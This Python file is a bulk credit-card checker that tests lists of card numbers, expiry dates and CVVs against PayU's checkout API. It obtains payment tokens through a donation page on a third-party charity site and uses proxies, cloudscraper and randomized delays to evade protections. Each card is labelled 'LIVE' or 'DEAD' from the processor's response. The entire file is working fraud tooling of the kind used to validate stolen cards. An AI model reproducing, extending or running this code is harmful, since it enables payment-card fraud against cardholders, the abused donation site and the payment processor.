import json
import time
import random
import re
import logging

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

logger = logging.getLogger(__name__)

PAYU_SITE = "https://miraclemanna.org"
UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"

BIN_APIS = [
    "https://lookup.binlist.net/{bin}",
    "https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin}",
]


def fetch_bin_info(bin_number):
    headers = {"Accept-Version": "3", "User-Agent": UA}
    for url_template in BIN_APIS:
        try:
            url = url_template.format(bin=bin_number[:6])
            import requests
            res = requests.get(url, headers=headers, timeout=8)
            if res.status_code == 200:
                data = res.json()
                bank = data.get("bank", {}).get("name", "Unknown") if isinstance(data.get("bank"), dict) else data.get("bank", "Unknown")
                scheme = data.get("scheme", data.get("brand", "Unknown")).upper()
                card_type = data.get("type", "Unknown").upper()
                country = data.get("country", {}).get("name", "Unknown") if isinstance(data.get("country"), dict) else data.get("country", "Unknown")
                return bank, f"{scheme}/{card_type}", country
        except:
            continue
    return "Unknown", "Unknown", "Unknown"


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if "://" not in proxy_str:
        if "@" in proxy_str:
            proxy_str = f"http://{proxy_str}"
        else:
            proxy_str = f"http://{proxy_str}"

    return {"http": proxy_str, "https": proxy_str}


def process_single_card(card_line, proxy=None):
    start_time = time.time()

    def safe_mask(line):
        cleaned = re.sub(r'[^0-9]', '', line.split('|')[0] if '|' in line else line)
        if len(cleaned) >= 10:
            return f"{cleaned[:6]}******{cleaned[-4:]}"
        elif len(cleaned) >= 4:
            return f"{'*' * (len(cleaned) - 4)}{cleaned[-4:]}"
        return "****"

    if cloudscraper is None:
        return {
            "card": "REDACTED", "masked": safe_mask(card_line),
            "status": "ERROR", "message": "cloudscraper not installed",
            "category": "ERROR",
            "bank": "N/A", "scheme": "N/A", "country": "N/A",
            "time": 0
        }

    try:
        parts = card_line.replace('/', '|').replace(' ', '|').split('|')
        if len(parts) < 4:
            return {
                "card": "REDACTED", "masked": safe_mask(card_line),
                "status": "ERROR", "message": "Invalid card format (need cc|mm|yy|cvv)",
                "category": "ERROR",
                "bank": "N/A", "scheme": "N/A", "country": "N/A",
                "time": 0
            }
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    except Exception:
        return {
            "card": "REDACTED", "masked": safe_mask(card_line),
            "status": "ERROR", "message": "Invalid card format",
            "category": "ERROR",
            "bank": "N/A", "scheme": "N/A", "country": "N/A",
            "time": 0
        }

    if len(yy) == 4:
        yy = yy[-2:]

    masked = f"{cc[:6]}******{cc[-4:]}" if len(cc) >= 10 else safe_mask(card_line)
    bank, scheme, country = fetch_bin_info(cc[:6])

    proxy_dict = parse_proxy(proxy)

    try:
        scraper = cloudscraper.create_scraper()
        if proxy_dict:
            scraper.proxies = proxy_dict

        headers = {
            'User-Agent': UA,
            'Accept': "*/*",
            'Referer': f"{PAYU_SITE}/donate.php",
            'Accept-Language': "en-IN,en;q=0.9"
        }

        r1 = scraper.get(f"{PAYU_SITE}/pm.php?name=Onichan%20Bot&amount=1", headers=headers, timeout=30)
        if r1.status_code != 200 or 'txnid' not in r1.text:
            return {
                "card": "REDACTED", "masked": masked,
                "status": "ERROR", "message": "Failed to get PayU form data",
                "category": "ERROR",
                "bank": bank, "scheme": scheme, "country": country,
                "time": round(time.time() - start_time, 2)
            }

        try:
            txnid = r1.text.split('name="txnid" value="')[1].split('"')[0]
            hashval = r1.text.split('name="hash" value="')[1].split('"')[0]
            firstname = r1.text.split('name="firstname" value="')[1].split('"')[0]
            amount = r1.text.split('name="amount" value="')[1].split('"')[0]
            key = r1.text.split('name="key" value="')[1].split('"')[0]
        except:
            return {
                "card": "REDACTED", "masked": masked,
                "status": "ERROR", "message": "Failed to parse PayU form fields",
                "category": "ERROR",
                "bank": bank, "scheme": scheme, "country": country,
                "time": round(time.time() - start_time, 2)
            }

        payload2 = {
            'key': key, 'hash': hashval, 'txnid': txnid, 'amount': amount,
            'firstname': firstname, 'phone': '', 'email': '',
            'productinfo': 'P01,P02', 'service_provider': 'payu_paisa',
            'surl': f'{PAYU_SITE}/success.php',
            'furl': f'{PAYU_SITE}/fail.php'
        }

        r2 = scraper.post("https://secure.payu.in/_payment", data=payload2, headers=headers, allow_redirects=False, timeout=30)
        redirect_url = r2.headers.get("Location", "")
        if not redirect_url or "/public/#/" not in redirect_url:
            return {
                "card": "REDACTED", "masked": masked,
                "status": "ERROR", "message": "PayU redirect failed",
                "category": "ERROR",
                "bank": bank, "scheme": scheme, "country": country,
                "time": round(time.time() - start_time, 2)
            }

        pay_id = redirect_url.split("/#/")[1]

        r3 = scraper.get(f"https://api.payu.in/checkoutx?paymentId={pay_id}", headers=headers, timeout=30)
        try:
            full_data = r3.json()
            txn = full_data.get("transaction", {})
            baseMihpayid = txn["baseMihpayid"]
            accessToken = txn["accessToken"]
        except Exception as e:
            return {
                "card": "REDACTED", "masked": masked,
                "status": "ERROR", "message": f"Failed to get PayU session: {str(e)[:50]}",
                "category": "ERROR",
                "bank": bank, "scheme": scheme, "country": country,
                "time": round(time.time() - start_time, 2)
            }

        url4 = "https://api.payu.in/checkoutx/payments"
        payload4 = {
            "window3DUsed": False,
            "userAgent": UA,
            "name": "CreditCard",
            "bankCode": "CC",
            "accessToken": accessToken,
            "paymentId": pay_id,
            "broker": "PAYU",
            "baseMihpayid": baseMihpayid,
            "additionalFields": {
                "quickPayRank": 2,
                "checkoutPageOption": "/cards",
                "field1": "paymentOptions",
                "field2": "nb,Cards,upi",
                "language": "en"
            },
            "cardNumber": cc,
            "cvv": cvv,
            "validThrough": f"{mm}/{yy}",
            "storeCard": False,
            "mobileNumber": "",
            "ownerName": "Test User",
            "consentKey": None
        }

        headers4 = {
            **headers,
            'Content-Type': 'application/json',
            'accesstoken': accessToken,
            'mid': '12778989',
            'paymentid': pay_id,
            'origin': "https://api.payu.in",
            'referer': "https://api.payu.in/public/"
        }

        r4 = scraper.post(url4, headers=headers4, json=payload4, timeout=30)

        try:
            data = r4.json()
            logger.info(f"PayU raw response: {json.dumps(data)[:500]}")

            status = str(data.get('status', '')).lower()
            result_obj = data.get('result', {}) if isinstance(data.get('result'), dict) else {}
            result_status = str(result_obj.get('status', '')).lower()
            result_error_msg = result_obj.get('errorMessage', '') or result_obj.get('error_Message', '') or ''
            result_unmap = str(result_obj.get('unmappedstatus', result_obj.get('unmappedStatus', ''))).lower()
            error_code = str(result_obj.get('errorCode', data.get('errorCode', ''))).lower()

            top_msg = data.get('message', '') or ''
            raw_msg = result_error_msg or top_msg or result_obj.get('message', '') or data.get('errorMessage', '') or 'No message'
            combined = f"{status} {result_status} {str(raw_msg).lower()} {result_unmap} {error_code} {str(top_msg).lower()}"

            redirect_url = data.get('redirectUrl', '') or data.get('redirect_url', '') or result_obj.get('redirectUrl', '') or ''

            def make_result(cat, msg):
                return {
                    "card": "REDACTED", "masked": masked,
                    "status": cat, "message": f"{cat} - {msg}: {raw_msg}",
                    "category": cat,
                    "bank": bank, "scheme": scheme, "country": country,
                    "time": round(time.time() - start_time, 2)
                }

            if any(w in combined for w in ['success', 'captured', 'approved']):
                return make_result("LIVE", "Payment Successful")

            if redirect_url or any(w in combined for w in ['redirect', '3ds', '3d secure', 'authentication required', 'otp', 'acs', 'enrolled']):
                return make_result("LIVE", "3DS/OTP Required")

            if any(w in combined for w in ['cvv', 'security code', 'cvc']):
                return make_result("LIVE", "CVV Mismatch")

            if any(w in combined for w in ['insufficient', 'not enough']):
                return make_result("LIVE", "Insufficient Funds")

            if any(w in combined for w in ['do not honor', 'do_not_honor', 'not_permitted', 'restricted', 'pickup', 'lost', 'stolen', 'fraud', 'suspected']):
                return make_result("DEAD", "Declined")

            if any(w in combined for w in ['declined', 'denied', 'rejected', 'not allowed', 'limit', 'exceed']):
                return make_result("DEAD", "Declined")

            if any(w in combined for w in ['invalid', 'incorrect', 'wrong']):
                return make_result("DEAD", "Invalid Card")

            if any(w in combined for w in ['expired', 'expiry']):
                return make_result("DEAD", "Expired Card")

            if 'failed' in combined or 'error' in combined or 'failure' in combined:
                return make_result("DEAD", "Failed")

            return make_result("UNKNOWN", "Unrecognized Response")

        except Exception as e:
            resp_text = r4.text[:200] if hasattr(r4, 'text') else ''
            logger.error(f"PayU parse error: {e}, response: {resp_text}")
            return {
                "card": "REDACTED", "masked": masked,
                "status": "ERROR", "message": f"Parse error: {str(e)[:50]}",
                "category": "ERROR",
                "bank": bank, "scheme": scheme, "country": country,
                "time": round(time.time() - start_time, 2)
            }

    except Exception as e:
        return {
            "card": "REDACTED", "masked": masked,
            "status": "ERROR", "message": f"Error: {str(e)[:80]}",
            "category": "ERROR",
            "bank": bank, "scheme": scheme, "country": country,
            "time": round(time.time() - start_time, 2)
        }


def run_payu_check(cards_text, proxy=None):
    results = []
    errors = []

    cards = [c.strip() for c in cards_text.strip().split('\n') if c.strip()]
    if not cards:
        return [], ["No cards provided"]

    for i, card_line in enumerate(cards):
        try:
            result = process_single_card(card_line, proxy)
            result["index"] = i + 1
            result["total"] = len(cards)
            results.append(result)
        except Exception as e:
            cc_part = re.sub(r'[^0-9]', '', card_line.split('|')[0] if '|' in card_line else card_line)
            safe_m = f"{cc_part[:6]}******{cc_part[-4:]}" if len(cc_part) >= 10 else "****"
            results.append({
                "card": "REDACTED", "masked": safe_m,
                "status": "ERROR", "message": str(e)[:100],
                "category": "ERROR",
                "bank": "N/A", "scheme": "N/A", "country": "N/A",
                "time": 0, "index": i + 1, "total": len(cards)
            })

        if i < len(cards) - 1:
            time.sleep(random.uniform(1.5, 3))

    return results, errors
